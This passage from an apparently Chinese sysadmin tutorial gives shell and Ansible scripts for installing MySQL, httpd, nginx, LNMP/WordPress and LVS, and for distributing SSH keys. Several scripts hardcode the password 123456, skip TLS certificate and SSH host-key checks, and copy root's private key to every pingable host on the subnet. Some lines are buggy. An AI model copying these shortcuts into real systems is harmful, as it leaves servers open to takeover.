tls-auth ta.key 1
cipher AES-256-CBC
verb 3
compress lz4-v2
EOF
    echo "证书存放路径:/etc/openvpn/client/${NAME},证书文件如下:"
    echo -e "\E[1;32m******************************************************************\E[0m"
    ls -l /etc/openvpn/client/${NAME}
    echo -e "\E[1;32m******************************************************************\E[0m"
    cd /etc/openvpn/client/${NAME}
    zip -qP "$PASS" /root/${NAME}.zip *
    action  "证书的打包文件已生成: /root/${NAME}.zip"
}   


read -p "请输入用户的姓名拼音(如:liusenbiao): " NAME

remove_cert
create_cert
```

### 4.7一键安装二进制Mysql脚本

```
#1.离线安装mysql-5.6
#!/bin/bash
DIR=`pwd`
NAME="mysql-5.6.47-linux-glibc2.12-x86_64.tar.gz"
FULL_NAME=${DIR}/${NAME}
DATA_DIR="/data/mysql"

yum install -y libaio perl-Data-Dumper  
if [ -f ${FULL_NAME} ];then
    echo "安装文件存在"
else
    echo "安装文件不存在"
    exit 3
fi
if [ -h /usr/local/mysql ];then
    echo "Mysql 已经安装"
    exit 3
else
    tar xvf ${FULL_NAME}   -C /usr/local/src
    ln -sv /usr/local/src/mysql-5.6.47-linux-glibc2.12-x86_64 /usr/local/mysql
    if id mysql;then
        echo "mysql 用户已经存在，跳过创建用户过程"
    else
       useradd  -r   -s /sbin/nologin mysql
     fi

    if id mysql;then
        chown  -R mysql.mysql /usr/local/mysql/* 
        if [ ! -d /data/mysql ];then
            mkdir -pv /data/mysql && chown  -R mysql.mysql /data   -R
           /usr/local/mysql/scripts/mysql_install_db  --user=mysql --
datadir=/data/mysql  --basedir=/usr/local/mysql/
 cp /usr/local/src/mysql-5.6.47-linux-glibc2.12-x86_64/support-files/mysql.server /etc/init.d/mysqld
           chmod a+x /etc/init.d/mysqld
           cp ${DIR}/my.cnf   /etc/my.cnf
           ln -sv /usr/local/mysql/bin/mysql /usr/bin/mysql
           /etc/init.d/mysqld start
          chkconfig --add mysqld
          else
            echo "MySQL数据目录已经存在,"
            exit 3
         fi
    fi
fi

[root@centos8 ~]#cat /etc/my.cnf
[mysqld]
socket=/data/mysql.sock
user=mysql
symbolic-links=0
datadir=/data/mysql
innodb_file_per_table=1
[client]
port=3306
socket=/data/mysql.sock
[mysqld_safe]
log-error=/var/log/mysqld.log
pid-file=/tmp/mysql.sock
[root@centos8 ~]#ls
install_mysql5.6.sh my.cnf mysql-5.6.47-linux-glibc2.12-x86_64.tar.gz



#2.在线安装mysql-5.6
###################################################################
# File Name: install_mysql_online.sh
# Author: liusenbiao
# mail: 1805336068@qq.com
# Created Time: Sun 22 May 2022 11:07:02 AM CST
#=============================================================
#!/bin/bash

. /etc/init.d/functions
DIR=`pwd`
MYSQL_VERSION=5.6.51
NAME="mysql-${MYSQL_VERSION}-linux-glibc2.12-x86_64.tar.gz"
FULL_NAME=${DIR}/${NAME}
URL=http://mirrors.163.com/mysql/Downloads/MySQL-5.6
DATA_DIR="/data/mysql"

rpm -q wget || yum -y -q install wget
wget $URL/$NAME || { action"下载失败,异常退出" false;exit 10; }
yum install -y -q libaio perl-Data-Dumper autoconf
if [ -f ${FULL_NAME} ];then
    action "安装文件存在"
else
    action "安装文件不存在" false
    exit 3
fi

if [ -e /usr/local/mysql ];then
   action "Mysql 已经安装" false
   exit 3
else
   tar xf ${FULL_NAME} -C /usr/local/src
   ln -sv /usr/local/src/mysql-${MYSQL_VERSION}-linux-glibc2.12-x86_64 /usr/local/mysql
   if id mysql;then
      action "mysql 用户已经存在，跳过创建用户过程"
   else
      useradd -r -s /sbin/nologin mysql
   fi

   if id mysql;then
       chown -R mysql.mysql /usr/local/mysql/*
       if [ ! -d /data/mysql ];then
         mkdir -pv /data/mysql && chown -R mysql.mysql /data
         /usr/local/mysql/scripts/mysql_install_db --user=mysql --datadir=/data/mysql --basedir=/usr/local/mysql/
         cp /usr/local/src/mysql-${MYSQL_VERSION}-linux-glibc2.12-x86_64/support-files/mysql.server /etc/init.d/mysqld
         chmod a+x /etc/init.d/mysqld
         cat > /etc/my.cnf << EOF
         [mysqld]
         socket=/data/mysql/mysql.sock
         user=mysql
         symbolic-links=0
         datadir=/data/mysql
         innodb_file_per_table=1
         [client]
         port=3306
         socket=/data/mysql/mysql.sock
         [mysqld_safe]
         log-error=/var/log/mysqld.log
         pid-file=/tmp/mysql.sock
EOF
          ln -sv /usr/local/mysql/bin/mysql /usr/bin/mysql
         /etc/init.d/mysqld start
         chkconfig --add mysqld
     else
         action "MySQL数据目录已经存在" false
         exit 3
     fi
  fi
fi


#3.离线安装MySQL5.7和MySQL8.0
###################################################################
# File Name: install_mysql5.7or8.0_offline.sh
# Author: liusenbiao
# mail: 1805336068@qq.com
# Created Time: Sun 22 May 2022 11:07:02 AM CST
#=============================================================
#!/bin/bash
. /etc/init.d/functions 
SRC_DIR=`pwd`
MYSQL='mysql-5.7.38-linux-glibc2.12-x86_64.tar.gz'
#MYSQL='mysql-8.0.27-linux-glibc2.12-x86_64.tar.xz'
COLOR='echo -e \E[01;31m'
END='\E[0m'
MYSQL_ROOT_PASSWORD=123456

check (){

if [ $UID -ne 0 ]; then
  action "当前用户不是root,安装失败" false
  exit 1
fi

cd  $SRC_DIR
if [ !  -e $MYSQL ];then
        $COLOR"缺少${MYSQL}文件"$END
		$COLOR"请将相关软件放在${SRC_DIR}目录下"$END
        exit
elif [ -e /usr/local/mysql ];then
        action "数据库已存在，安装失败" false
        exit
else
	return
fi
} 

install_mysql(){
    $COLOR"开始安装MySQL数据库..."$END
	yum  -y -q install libaio numactl-libs   libaio &> /dev/null
    cd $SRC_DIR
    tar xf $MYSQL -C /usr/local/
    MYSQL_DIR=`echo $MYSQL| sed -nr 's/^(.*[0-9]).*/\1/p'`
    ln -s  /usr/local/$MYSQL_DIR /usr/local/mysql
    chown -R  root.root /usr/local/mysql/
    id mysql &> /dev/null || { useradd -s /sbin/nologin -r  mysql ; action "创建mysql用户"; }
        
    echo 'PATH=/usr/local/mysql/bin/:$PATH' > /etc/profile.d/mysql.sh
    .  /etc/profile.d/mysql.sh
	ln -s /usr/local/mysql/bin/* /usr/bin/
    cat > /etc/my.cnf << EOF
[mysqld]
server-id=1
log-bin
datadir=/data/mysql
socket=/data/mysql/mysql.sock                 
log-error=/data/mysql/mysql.log
pid-file=/data/mysql/mysql.pid
[client]
socket=/data/mysql/mysql.sock
EOF
    [ -d /data ] || mkdir /data
    mysqld --initialize --user=mysql --datadir=/data/mysql 
    cp /usr/local/mysql/support-files/mysql.server  /etc/init.d/mysqld
    chkconfig --add mysqld
    chkconfig mysqld on
    service mysqld start
	sleep 3
    [ $? -ne 0 ] && { $COLOR"数据库启动失败，退出!"$END;exit; }
    MYSQL_OLDPASSWORD=`awk '/A temporary password/{print $NF}' /data/mysql/mysql.log`
    mysqladmin  -uroot -p$MYSQL_OLDPASSWORD password $MYSQL_ROOT_PASSWORD &>/dev/null
    action "数据库安装完成" 
}

check
install_mysql


#4.在线安装MySQL5.7和MySQL8.0
###################################################################
# File Name: install_mysql5.7or8.0_offline.sh
# Author: liusenbiao
# mail: 1805336068@qq.com
# Created Time: Sun 22 May 2022 11:07:02 AM CST
#=============================================================
#!/bin/bash
. /etc/init.d/functions
SRC_DIR=`pwd`
#MYSQL='mysql-5.7.38-linux-glibc2.12-x86_64.tar.gz'
MYSQL='mysql-8.0.27-linux-glibc2.12-x86_64.tar.xz'
URL=http://mirrors.163.com/mysql/Downloads/MySQL-5.7
#URL=http://mirrors.163.com/mysql/Downloads/MySQL-8.0

COLOR='echo -e \E[01;31m'
END='\E[0m'
MYSQL_ROOT_PASSWORD=123456


check (){

if [ $UID -ne 0 ]; then
  action "当前用户不是root,安装失败" false
  exit 1
fi

cd  $SRC_DIR
rpm -q wget || yum -y -q install wget
wget $URL/$MYSQL
if [ !  -e $MYSQL ];then
        $COLOR"缺少${MYSQL}文件"$END
        $COLOR"请将相关软件放在${SRC_DIR}目录下"$END
        exit
elif [ -e /usr/local/mysql ];then
        action "数据库已存在，安装失败" false
        exit
else
        return
fi
}

install_mysql(){
        $COLOR"开始安装MySQL数据库..."$END
        yum  -y -q install libaio numactl-libs
        cd $SRC_DIR
        tar xf $MYSQL -C /usr/local/
        MYSQL_DIR=`echo $MYSQL| sed -nr 's/^(.*[0-9]).*/\1/p'`
        ln -s  /usr/local/$MYSQL_DIR /usr/local/mysql
        chown -R  root.root /usr/local/mysql/
        id mysql &> /dev/null || { useradd -s /sbin/nologin -r  mysql ; action "创建mysql用户"; }

        echo 'PATH=/usr/local/mysql/bin/:$PATH' > /etc/profile.d/mysql.sh
        .  /etc/profile.d/mysql.sh
        ln -s /usr/local/mysql/bin/* /usr/bin/
        cat > /etc/my.cnf << EOF
[mysqld]
server-id=1
log-bin
datadir=/data/mysql
socket=/data/mysql/mysql.sock
log-error=/data/mysql/mysql.log
pid-file=/data/mysql/mysql.pid
[client]
socket=/data/mysql/mysql.sock
EOF
    [ -d /data ] || mkdir /data
    mysqld --initialize --user=mysql --datadir=/data/mysql
    cp /usr/local/mysql/support-files/mysql.server  /etc/init.d/mysqld
    chkconfig --add mysqld
    chkconfig mysqld on
    service mysqld start
    [ $? -ne 0 ] && { $COLOR"数据库启动失败，退出!"$END;exit; }
    MYSQL_OLDPASSWORD=`awk '/A temporary password/{print $NF}' /data/mysql/mysql.log`
    mysqladmin  -uroot -p$MYSQL_OLDPASSWORD password $MYSQL_ROOT_PASSWORD &>/dev/null
    action "数据库安装完成"
}

check
install_mysql
```

### 4.8基于key验证多主机ssh访问

```
#!/bin/bash
#
#*********************************************
#Author:            liusenbiao
#Description：      基于key验证多主机ssh访问
#Date:              2021-03-31
#*********************************************

PASS=123456
#设置网段最后的地址，4-255之间，越小扫描越快
END=254

IP=`ip a s eth0 | awk -F'[ /]+' 'NR==3{print $3}'`
NET=${IP%.*}.

rm -f /root/.ssh/id_rsa
[ -e ./SCANIP.log ] && rm -f SCANIP.log
for((i=3;i<="$END";i++));do
ping -c 1 -w 1  ${NET}$i &> /dev/null  && echo "${NET}$i" >> SCANIP.log &
done
wait

ssh-keygen -P "" -f /root/.ssh/id_rsa
rpm -q sshpass || yum -y install sshpass
sshpass -p $PASS ssh-copy-id -o StrictHostKeyChecking=no $IP 

AliveIP=(`cat SCANIP.log`)
for n in ${AliveIP[*]};do
sshpass -p $PASS scp -o StrictHostKeyChecking=no -r /root/.ssh root@${n}:
done

#把.ssh/known_hosts拷贝到所有主机，使它们第一次互相访问时不需要输入回车
for n in ${AliveIP[*]};do
scp /root/.ssh/known_hosts ${n}:.ssh/
done
```

### 4.9一键编译安装Httpd-2.4.53

```
###################################################################
# File Name: install_httpd.sh
# Author: liusenbiao
# mail: 1805336068@qq.com
# Created Time: Mon 06 Jun 2022 11:22:37 AM CST
#=============================================================
#!/bin/bash
APR_URL=https://mirrors.tuna.tsinghua.edu.cn/apache/apr/
APR_FILE=apr-1.7.0
TAR=.tar.bz2
APR_UTIL_URL=https://mirrors.tuna.tsinghua.edu.cn/apache/apr/
APR_UTIL_FILE=apr-util-1.6.1
HTTPD_URL=https://mirrors.tuna.tsinghua.edu.cn/apache/httpd/
HTTPD_FILE=httpd-2.4.53
INSTALL_DIR=/data/httpd-2.4.53
CPUS=`lscpu | awk '/^CPU\(s\)/{print $2}'`
MPM=event
install_httpd(){
if [ `awk -F'"' '/^ID=/{print $2}' /etc/os-release` == "centos" ] &> /dev/null;then
  yum -y install gcc make expat-devel pcre-devel openssl-devel wget bzip2
else
  sudo apt update
  sudo apt -y install gcc libapr1-dev libaprutil1-dev libpcre3 libpcre3-dev libssl-dev wget make
fi

cd /usr/local/src
wget $APR_URL$APR_FILE$TAR --no-check-certificate && wget $APR_UTIL_URL$APR_UTIL_FILE$TAR --no-check-certificate  && wget $HTTPD_URL$HTTPD_FILE$TAR --no-check-certificate
tar xf $APR_FILE$TAR && tar xf $APR_UTIL_FILE$TAR && tar xf $HTTPD_FILE$TAR
mv $APR_FILE $HTTPD_FILE/srclib/apr
mv $APR_UTIL_FILE $HTTPD_FILE/srclib/apr-util
cd $HTTPD_FILE
./configure --prefix=$INSTALL_DIR --enable-so --enable-ssl --enable-cgi --enable-rewrite --with-zlib --with-pcre --with-included-apr --enable-modules=most --enable-mpms-shared=all --with-mpm=$MPM
make -j $CPUS && make install
useradd -s /sbin/nologin -r apache
sed -i 's/daemon/apache' $INSTALL_DIR/conf/httpd.conf
echo "PATH=/data/httpd-2.4.53/bin:$PATH" > /etc/profile.d/$HTTPD_FILE.sh
. /etc/profile.d/$HTTPD_FILE.sh
cat > /lib/systemd/system/httpd.service <<EOF
[Unit]
Description=The Apache HTTP Server
After=network.target remote-fs.target nss-lookup.target
Documentation=man:httpd(8)
Documentation=man:apachectl(8)
[Service]
Type=forking
ExecStart=${INSTALL_DIR}/bin/apachectl start
ExecReload=${INSTALL_DIR}/bin/apachectl graceful
ExecStop=${INSTALL_DIR}/bin/apachectl stop
killSignal=SIGCONT
PrivateTmp=true
[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl enable --now httpd
}

install_httpd
```

### 4.10一键编译安装Nginx脚本

```
#!/bin/bash
#
#********************************************************************
#Author:			liusenbiao
#Date: 				2022-06-21
#FileName：			install_nginx.sh
#URL: 				http://www.liusenbiao.com
#Description：		The test script
#********************************************************************
SRC_DIR=/usr/local/src
NGINX_URL=http://nginx.org/download/
NGINX_FILE=nginx-1.18.0
TAR=.tar.gz
NGINX_INSTALL_DIR=/apps/nginx
CPUS=`lscpu |awk '/^CPU\(s\)/{print $2}'`

color () {
    RES_COL=60
    MOVE_TO_COL="echo -en \\033[${RES_COL}G"
    SETCOLOR_SUCCESS="echo -en \\033[1;32m"
    SETCOLOR_FAILURE="echo -en \\033[1;31m"
    SETCOLOR_WARNING="echo -en \\033[1;33m"
    SETCOLOR_NORMAL="echo -en \E[0m"
    echo -n "$1" && $MOVE_TO_COL
    echo -n "["
    if [ $2 = "success" -o $2 = "0" ] ;then
        ${SETCOLOR_SUCCESS}
        echo -n $"  OK  "    
    elif [ $2 = "failure" -o $2 = "1"  ] ;then 
        ${SETCOLOR_FAILURE}
        echo -n $"FAILED"
    else
        ${SETCOLOR_WARNING}
        echo -n $"WARNING"
    fi
    ${SETCOLOR_NORMAL}
    echo -n "]"
    echo 
}

os_type () {
   awk -F'[ "]' '/^NAME/{print $2}' /etc/os-release
}

os_version () {
   awk -F'"' '/^VERSION_ID/{print $2}' /etc/os-release
}

check () {
    [ -e ${NGINX_INSTALL_DIR} ] && { color "nginx 已安装,请卸载后再安装" 1; exit; }
    cd  ${SRC_DIR}
    if [  -e ${NGINX_FILE}${TAR} ];then
        color "相关文件已准备好" 0
    else
        color '开始下载 nginx 源码包' 0
        rpm -q wget &> /dev/null || yum -y install wget &> /dev/null
        wget ${NGINX_URL}${NGINX_FILE}${TAR} 
        [ $? -ne 0 ] && { color "下载 ${NGINX_FILE}${TAR}文件失败" 1; exit; } 
    fi
} 

install () {
    color "开始安装 nginx" 0
    if id nginx  &> /dev/null;then
        color "nginx 用户已存在" 1 
    else
        useradd -s /sbin/nologin -r  nginx
        color "创建 nginx 用户" 0 
    fi
    color "开始安装 nginx 依赖包" 0
    if [ `os_type` == "CentOS" -a `os_version` == '8' ] ;then
        yum -y -q install make gcc-c++ libtool pcre pcre-devel zlib zlib-devel openssl openssl-devel perl-ExtUtils-Embed 
    elif [ `os_type` == "CentOS" -a `os_version` == '7' ];then
        yum -y -q  install make gcc pcre-devel openssl-devel zlib-devel perl-ExtUtils-Embed
    else
        apt update &> /dev/null
        apt -y install make gcc libpcre3 libpcre3-dev openssl libssl-dev zlib1g-dev &> /dev/null
    fi
    cd $SRC_DIR
    tar xf ${NGINX_FILE}${TAR}
    NGINX_DIR=`echo ${NGINX_FILE}${TAR}| sed -nr 's/^(.*[0-9]).*/\1/p'`
    cd ${NGINX_DIR}
    ./configure --prefix=${NGINX_INSTALL_DIR} --user=nginx --group=nginx --with-http_ssl_module --with-http_v2_module --with-http_realip_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcre --with-stream --with-stream_ssl_module --with-stream_realip_module 
    make -j $CPUS && make install 
    [ $? -eq 0 ] && color "nginx 编译安装成功" 0 ||  { color "nginx 编译安装失败,退出!" 1 ;exit; }
    echo "PATH=${NGINX_INSTALL_DIR}/sbin:${PATH}" > /etc/profile.d/nginx.sh
    cat > /lib/systemd/system/nginx.service <<EOF
[Unit]
Description=The nginx HTTP and reverse proxy server
After=network.target remote-fs.target nss-lookup.target

[Service]
Type=forking
PIDFile=${NGINX_INSTALL_DIR}/logs/nginx.pid
ExecStartPre=/bin/rm -f ${NGINX_INSTALL_DIR}/logs/nginx.pid
ExecStartPre=${NGINX_INSTALL_DIR}/sbin/nginx -t
ExecStart=${NGINX_INSTALL_DIR}/sbin/nginx
ExecReload=/bin/kill -s HUP \$MAINPID
KillSignal=SIGQUIT
TimeoutStopSec=5
KillMode=process
PrivateTmp=true

[Install]
WantedBy=multi-user.target
EOF
    systemctl daemon-reload
    ln -s /apps/nginx/sbin/nginx /usr/sbin/
    systemctl enable --now nginx &> /dev/null 
    systemctl is-active nginx &> /dev/null ||  { color "nginx 启动失败,退出!" 1 ; exit; }
    color "nginx 安装完成" 0
}

check
install
```

### 4.11ansible编译安装Nginx脚本

```
---
- hosts: webservers
  remote_user: root
  gather_facts: yes
  vars:
    nginx_verison: nginx-1.18.0
    suffix: .tar.gz
    down_dir: /usr/local/src/
    ins_dir: /apps/nginx/
    user: nginx
    group: nginx

  tasks:
    - name: install packages on centos8
      yum:
        name:
          - gcc
          - make
          - pcre-devel
          - openssl-devel
          - zlib-devel
        state: present
      when: 
        - ansible_facts['distribution'] == "CentOS" 
        - ansible_facts['distribution_major_version'] == "8"
    - name: install packages on centos7
      yum:
        name:
          - gcc
          - make
          - pcre-devel
          - openssl-devel
          - zlib-devel
          - perl-ExtUtils-Embed
        state: present
      when: 
        - ansible_facts['distribution'] == "CentOS" 
        - ansible_facts['distribution_major_version'] == "7"

    - name: install packages on ubuntu18.04
      apt:
        name:
          - gcc
          - make
          - libpcre3
          - libpcre3-dev
          - openssl
          - libssl-dev
          - zlib1g-dev
        state: present
      when:
        - ansible_facts['distribution'] == "Ubuntu" 
        - ansible_facts['distribution_major_version'] == "18"
    - name: group "{{ group }}"
      group: name={{ group }} state=present system=yes
    - name: user "{{ user }}"
      user:
        name: "{{ user }}"
        shell: /sbin/nologin
        system: yes
        group: "{{ group }}"
        home: "/home/{{ user }}"
        create_home: no
    - name: unarchive
      unarchive:
        src: "http://nginx.org/download/{{ nginx_verison }}{{ suffix }}"
        dest: "{{ down_dir }}"
        remote_src: yes
    - name: configure
      shell: ./configure \
                --prefix={{ ins_dir }} \
                --user={{ user }} --group={{ group }} \
                --with-http_ssl_module \
                --with-http_realip_module \
                --with-http_v2_module \
                --with-http_stub_status_module \
                --with-http_gzip_static_module \
                --with-pcre \
                --with-stream \
                --with-stream_ssl_module \
                --with-stream_realip_module
      args:
        chdir: "{{ down_dir }}{{ nginx_verison }}/"
    - name: make
      shell: make -j "{{ ansible_processor_vcpus }}" && make install
      args:
        chdir: "{{ down_dir }}{{ nginx_verison }}/"
    - name: link
      file:
        src: "{{ ins_dir }}sbin/nginx"
        dest: /usr/sbin/nginx
        state: link
    - name: service file
      copy: content='[Unit]\nDescription=nginx - high performance web server\nDocumentation=http://nginx.org/en/docs/\nAfter=network-online.target remote-fs.target nss-lookup.target\nWants=network-online.target\n\n[Service]\nType=forking\nPIDFile={{ ins_dir }}run/nginx.pid\nExecStart=/usr/sbin/nginx -c {{ ins_dir }}conf/nginx.conf\nExecReload=/bin/sh -c "/bin/kill -s HUP $(/bin/cat {{ ins_dir }}run/nginx.pid)"\nExecStop=/bin/sh -c "/bin/kill -s TERM $(/bin/cat {{ ins_dir }}run/nginx.pid)"\n\n[Install]\nWantedBy=multi-user.target' dest=/lib/systemd/system/nginx.service
    - name: change configure pid location and change worker_processes
      lineinfile:
        path: "{{ item.path }}"
        regexp: "{{ item.regexp }}"
        line: "{{ item.line }}"
      with_items:
        - { path: "{{ ins_dir }}conf/nginx.conf",regexp: '^worker_processes',line: "worker_processes  {{ ansible_processor_vcpus }};" }
        - { path: "{{ ins_dir }}conf/nginx.conf",regexp: '^#pid',line: 'pid        run/nginx.pid;' }
    - name: create dir run and modify directory permission
      file: 
        path: "{{ ins_dir }}run"
        owner: "{{ user }}"
        group: "{{ group }}"
        state: directory
    - name: start serivce
      service: 
        name: nginx
        state: started
        enabled: yes
        
[20:11:33 root@centos7 ~]# ansible-playbook install_nginx.yml
```

### 4.12一键实现LNMP脚本

```
#!/bin/bash
#
#********************************************************************
#Author:        liusenbiao
#Date:          2022-06-30
#FileName：      lnmp.sh
#Description：   LNMP wordpress博客系统 
#********************************************************************
SRC_DIR=/usr/local/src
NGINX_URL=http://nginx.org/download/
NGINX='nginx-1.18.0.tar.gz'
MYSQL_URL=http://mirrors.163.com/mysql/Downloads/MySQL-5.7/
MYSQL='mysql-5.7.38-linux-glibc2.12-x86_64.tar.gz'
PHP_URL=https://www.php.net/distributions/
PHP='php-7.4.10.tar.xz'
WORDPRESS_URL=https://cn.wordpress.org/
APP='latest-zh_CN.tar.gz'
COLOR="echo -e \\033[01;31m"
END='\033[0m'
MYSQL_ROOT_PASSWORD=123456
MYSQL_WORDPRESS_PASSWORD=123456
CPU=`lscpu| awk '/^CPU\(s\):/{print $NF}'`

${COLOR}'开始安装基于LNMP的wordpress'$END
sleep 3

install_tars (){
cd  $SRC_DIR
rpm -q wget || yum -y -q install wget
rpm -q lrzsz || yum -y install lrzsz
wget ${PHP_URL}${PHP}
wget ${MYSQL_URL}${MYSQL}
wget ${NGINX_URL}${NGINX}
wget ${WORDPRESS_URL}${APP}
}

check_file (){
cd  $SRC_DIR
$COLOR"请将相关软件放在${SRC_DIR}目录下"$END
if [ ! -e $NGINX ];then
    $COLOR"缺少${NGINX}文件"$END
        exit
elif [ !  -e $MYSQL ];then
        $COLOR"缺少${MYSQL}文件"$END
        exit
elif [ ! -e $PHP ];then
        $COLOR"缺少${PHP}文件"$END
        exit
elif [ ! -e $APP ];then
        $COLOR"缺少${APP}文件"$END
        exit
else
    $COLOR"相关文件已准备好"$END
fi
} 
install_mysql(){
    $COLOR"开始安装MySQL数据库"$END
    cd $SRC_DIR
    tar xf $MYSQL -C /usr/local/
    if [ -e /usr/local/mysql ];then
        $COLOR"数据库已存在，安装失败"$END
        exit
    fi
    MYSQL_DIR=`echo $MYSQL| sed -nr 's/^(.*[0-9]).*/\1/p'`
    ln -s  /usr/local/$MYSQL_DIR /usr/local/mysql
    chown -R  root.root /usr/local/mysql/
    id mysql &> /dev/null || { useradd -s /sbin/nologin -r  mysql ; $COLOR"创建mysql用户"$END; }
    yum  -y -q install numactl-libs   libaio &> /dev/null

    echo 'PATH=/usr/local/mysql/bin/:$PATH' > /etc/profile.d/lamp.sh
    .  /etc/profile.d/lamp.sh
    cat > /etc/my.cnf <<-EOF
[mysqld]
server-id=1
log-bin
datadir=/data/mysql
socket=/data/mysql/mysql.sock                                                                                                   
log-error=/data/mysql/mysql.log
pid-file=/data/mysql/mysql.pid
[client]
socket=/data/mysql/mysql.sock
EOF
    [ -d /data ] || mkdir /data
    mysqld --initialize --user=mysql --datadir=/data/mysql 
    cp /usr/local/mysql/support-files/mysql.server  /etc/init.d/mysqld
    chkconfig --add mysqld
    chkconfig mysqld on
    service mysqld start
    [ $? -ne 0 ] && { $COLOR"数据库启动失败，退出!"$END;exit; }
    MYSQL_OLDPASSWORD=`awk '/A temporary password/{print $NF}' /data/mysql/mysql.log`
    mysqladmin  -uroot -p$MYSQL_OLDPASSWORD password $MYSQL_ROOT_PASSWORD &>/dev/null
    $COLOR"数据库安装完成"$END
}

install_nginx(){
   ${COLOR}"开始安装NGINX"$END
   id nginx  &> /dev/null || { useradd -s /sbin/nologin -r  nginx; $COLOR"创建nginx用户"$END; }
   $COLOR"安装nginx相关包"$END
   yum -q -y install gcc pcre-devel openssl-devel zlib-devel perl-ExtUtils-Embed git &> /dev/null
   cd $SRC_DIR
   tar xf $NGINX 
#   git clone https://github.com/openresty/echo-nginx-module.git || { $COLOR"下载NGINX第三方模块失败,退出!"$END;exit; }
   NGINX_DIR=`echo $NGINX| sed -nr 's/^(.*[0-9]).*/\1/p'`
   cd $NGINX_DIR
   ./configure --prefix=/apps/nginx --user=nginx --group=nginx --with-http_ssl_module --with-http_v2_module --with-http_realip_module --with-http_stub_status_module --with-http_gzip_static_module --with-http_perl_module --with-pcre --with-stream --with-stream_ssl_module --with-stream_realip_module 
   make -j $CPU && make install 
   [ $? -eq 0 ] && $COLOR"NGINX编译安装成功"$END ||  { $COLOR"NGINX编译安装失败,退出!"$END;exit; }
   [ -d /data/www ] || mkdir -pv /data/www/
   cat > /apps/nginx/conf/nginx.conf <<EOF
worker_processes  auto;
events {
    worker_connections  10240;
}
http {
    include       mime.types;
    default_type  application/octet-stream;
    server_tokens off;
    log_format  main  '\$remote_addr - \$remote_user [\$time_local] "\$request" '
    sendfile        on;
    client_max_body_size 100m;
    keepalive_timeout  65;
    server {
        listen       80 default_server;
        server_name  localhost ; 
        root /data/www ;
        access_log  logs/nginx.access.log  main;
        location / {
            root   /data/www/;
            index  index.php index.html index.htm;
        }
        error_page   500 502 503 504  /50x.html;
        location = /50x.html {
            root   html;
        }
        location ~ \.php$ {
            root           /data/www;
            fastcgi_pass   127.0.0.1:9000;
            fastcgi_index  index.php;
            fastcgi_param  SCRIPT_FILENAME  \$document_root\$fastcgi_script_name;
            include        fastcgi_params;
        }
    }
}
EOF
    echo  'PATH=/apps/nginx/sbin:$PATH' >> /etc/profile.d/lamp.sh
    cat > /usr/lib/systemd/system/nginx.service <<EOF
[Unit]
After=network.target remote-fs.target nss-lookup.target 

[Service]
Type=forking 

ExecStart=/apps/nginx/sbin/nginx

ExecReload=/apps/nginx/sbin/nginx -s reload

ExecStop=/apps/nginx/sbin/nginx -s stop

[Install]
WantedBy=multi-user.target
EOF

    systemctl daemon-reload
    systemctl start nginx 
    systemctl is-active nginx &> /dev/null ||  { $COLOR"NGINX 启动失败,退出!"$END ; exit; }
    $COLOR"NGINX安装完成"
}
install_php (){
    ${COLOR}"开始安装PHP"$END
    yum -y -q  install gcc make libxml2-devel bzip2-devel libmcrypt-devel libsqlite3x-devel oniguruma-devel &>/dev/null
    cd $SRC_DIR
    tar xf $PHP
    PHP_DIR=`echo $PHP| sed -nr 's/^(.*[0-9]).*/\1/p'`
    cd $PHP_DIR
     ./configure --prefix=/apps/php74 --enable-mysqlnd --with-mysqli=mysqlnd --with-pdo-mysql=mysqlnd --with-openssl    --with-zlib  --with-config-file-path=/etc --with-config-file-scan-dir=/etc/php.d --enable-mbstring --enable-xml --enable-sockets --enable-fpm --enable-maintainer-zts --disable-fileinfo
    make -j $CPU && make install 
    [ $? -eq 0 ] && $COLOR"PHP编译安装成功"$END ||  { $COLOR"PHP编译安装失败,退出!"$END;exit; }
    cp php.ini-production  /etc/php.ini
    mkdir /etc/php.d/
    cat > /etc/php.d/opcache.ini <<EOF
[opcache]
zend_extension=opcache.so               
opcache.enable=1
EOF

    cp  sapi/fpm/php-fpm.service /usr/lib/systemd/system/
    cd /apps/php74/etc
    cp  php-fpm.conf.default  php-fpm.conf
    cd  php-fpm.d/
    cp www.conf.default www.conf
    id nginx  &> /dev/null || { useradd -s /sbin/nologin -r  nginx; $COLOR"创建nginx用户"$END; }
    sed -i.bak  -e  's/^user.*/user = nginx/' -e 's/^group.*/group = nginx/' /apps/php74/etc/php-fpm.d/www.conf
    sed -i.bak 's/expose_php = On/expose_php = off/' /etc/php.ini
    sed -i.bak 's/post_max_size = 8M/post_max_size = 80M/' /etc/php.ini
    sed -i.bak 's/upload_max_filesize = 2M/upload_max_filesize = 50M/' /etc/php.ini

    systemctl daemon-reload
    systemctl start php-fpm 
    systemctl is-active  php-fpm &> /dev/null ||  { $COLOR"PHP-FPM 启动失败,退出!"$END ; exit; }
    $COLOR"PHP安装完成"

}
install_wordpress(){
    cd $SRC_DIR
    tar xf $APP  
    [ -d /data/www ] || mkdir -pv /data/www
    mv wordpress/* /data/www/
    chown -R nginx.nginx /data/www/wp-content/
    cd /data/www/
    mv wp-config-sample.php wp-config.php
    mysql -uroot -p"$MYSQL_ROOT_PASSWORD" -e "create database wordpress;grant all on wordpress.* to wordpress@'127.0.0.1' identified by '$MYSQL_WORDPRESS_PASSWORD'" &>/dev/null
    sed -i.bak -e 's/database_name_here/wordpress/' -e 's/username_here/wordpress/' -e 's/password_here/'''$MYSQL_WORDPRESS_PASSWORD'''/' -e 's/localhost/127.0.0.1/'  wp-config.php
    $COLOR"WORDPRESS安装完成"
}

install_tars

check_file

install_mysql

install_nginx

install_php

install_wordpress
```

### 4.13一键实现LVS的RS和VS脚本

```
[root@rs1 ~]# vim lvs_dr_rs.sh
#!/bin/bash
#Author:liusenbiao
#Date:2022-05-13
vip=10.0.0.10
mask='255.255.255.255'
dev=lo:1

case $1 in
start)
    echo 1 > /proc/sys/net/ipv4/conf/all/arp_ignore
    echo 1 > /proc/sys/net/ipv4/conf/lo/arp_ignore
    echo 2 > /proc/sys/net/ipv4/conf/all/arp_announce
    echo 2 > /proc/sys/net/ipv4/conf/lo/arp_announce
    ifconfig $dev $vip netmask $mask
    echo "The RS Server is Ready!"
    ;;
stop)
    ifconfig $dev down
    echo 0 > /proc/sys/net/ipv4/conf/all/arp_ignore
    echo 0 > /proc/sys/net/ipv4/conf/lo/arp_ignore
    echo 0 > /proc/sys/net/ipv4/conf/all/arp_announce
    echo 0 > /proc/sys/net/ipv4/conf/lo/arp_announce
    echo "The RS Server is Canceled!"
    ;;
*)
    echo "Usage: $(basename $0) start|stop"
